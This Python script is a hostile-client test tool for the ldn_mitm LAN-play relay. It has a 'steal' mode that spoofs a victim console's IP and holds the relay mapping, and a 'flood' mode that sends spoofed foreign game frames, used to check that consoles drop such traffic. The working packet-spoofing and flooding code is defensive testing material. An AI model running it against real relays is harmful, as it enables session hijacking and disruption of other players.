#!/usr/bin/env python3
"""
Hostile third-party client for testing ldn_mitm against a shared relay.

  --mode steal  claim a victim console's real LAN IP on the relay and hold it
                with keepalives; the session (routed by vsrc) should be unaffected.
  --mode flood  broadcast game frames from IPs in no session; consoles should
                log "diag inject ... DROP not-peer ... (total N)".

Usage:
    python relay_steal_test.py --relay HOST:11451 --mode steal --victim 192.168.0.137
    python relay_steal_test.py --relay HOST:11451 --mode flood

Only point it at a relay you are authorised to test.
"""
import argparse
import socket
import struct
import time

TYPE_KEEPALIVE = 0x00
TYPE_IPV4      = 0x01

GAME_PORT = 12345  # not 11452 (discovery), so it reaches InjectGameFrame


def ip_bytes(dotted):
    return socket.inet_aton(dotted)


def ip_checksum(header):
    s = 0
    for i in range(0, len(header), 2):
        s += (header[i] << 8) | header[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def build_ipv4_udp(src_ip, dst_ip, sport, dport, payload):
    udp_len = 8 + len(payload)
    udp = struct.pack(">HHHH", sport, dport, udp_len, 0) + payload
    total = 20 + udp_len
    ip = bytearray(struct.pack(">BBHHHBBH4s4s",
        0x45, 0, total, 0x4242, 0x4000, 64, 17, 0,
        ip_bytes(src_ip), ip_bytes(dst_ip)))
    cs = ip_checksum(ip)
    ip[10] = cs >> 8
    ip[11] = cs & 0xFF
    return bytes(ip) + udp


def resolve(relay):
    host, _, port = relay.partition(":")
    return (socket.gethostbyname(host), int(port) if port else 11451)


def run_steal(sock, addr, args):
    frame = TYPE_IPV4.to_bytes(1, "big") + build_ipv4_udp(
        args.victim, "255.255.255.255", args.dport, args.dport, b"steal-test")
    print(f"[steal] relay {addr[0]}:{addr[1]}  claiming victim {args.victim}:{args.dport}")
    print("[steal] holding the mapping; Ctrl-C to stop. Watch the victim console's log.")
    n = 0
    while True:
        sock.sendto(frame, addr)
        sock.sendto(TYPE_KEEPALIVE.to_bytes(1, "big"), addr)
        n += 1
        if n <= 3 or n % 15 == 0:
            print(f"[steal] sent {n} claim(s) for {args.victim}")
        try:
            while True:
                data, _ = sock.recvfrom(2048)
                if data and data[0] == TYPE_IPV4:
                    print(f"[steal]   <- relay delivered {len(data)-1}B to us (mapping is live)")
        except (socket.timeout, ConnectionResetError):
            pass
        time.sleep(args.interval)


def run_flood(sock, addr, args):
    sources = args.sources or ["172.20.10.55", "172.20.10.56"]
    sizes = [56, 136, 260, 512, 844]
    print(f"[flood] relay {addr[0]}:{addr[1]}  broadcasting foreign game frames "
          f"on port {args.dport} from {', '.join(sources)}")
    print(f"[flood] ~{args.rate}/s; Ctrl-C to stop. Watch a console log for "
          f"'DROP not-peer ... (total N)'.")
    n = 0
    delay = 1.0 / max(1, args.rate)
    while True:
        src = sources[n % len(sources)]
        sz = sizes[n % len(sizes)]
        payload = bytes((n + i) & 0xFF for i in range(sz))
        frame = TYPE_IPV4.to_bytes(1, "big") + build_ipv4_udp(
            src, "255.255.255.255", args.dport, args.dport, payload)
        sock.sendto(frame, addr)
        sock.sendto(TYPE_KEEPALIVE.to_bytes(1, "big"), addr)
        n += 1
        if n <= 3 or n % 100 == 0:
            print(f"[flood] sent {n} foreign frames")
        time.sleep(delay)


def main():
    ap = argparse.ArgumentParser(description="lan-play relay abuse reproductions (ldn_mitm tests 6/7).")
    ap.add_argument("--relay", required=True, help="relay host:port both consoles use")
    ap.add_argument("--mode", choices=["steal", "flood"], default="steal", help="which reproduction to run")
    ap.add_argument("--dport", type=int, default=GAME_PORT, help=f"game UDP port (default {GAME_PORT})")
    ap.add_argument("--victim", help="[steal] victim console's real LAN IP to impersonate")
    ap.add_argument("--interval", type=float, default=2.0, help="[steal] seconds between claims (default 2)")
    ap.add_argument("--sources", nargs="*", help="[flood] foreign source IPs (default two 172.20.10.x)")
    ap.add_argument("--rate", type=int, default=30, help="[flood] frames per second (default 30)")
    args = ap.parse_args()

    if args.mode == "steal" and not args.victim:
        ap.error("--mode steal requires --victim")

    addr = resolve(args.relay)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1.0)
    try:
        (run_steal if args.mode == "steal" else run_flood)(sock, addr, args)
    except KeyboardInterrupt:
        print("\n[done] stopped")


if __name__ == "__main__":
    main()
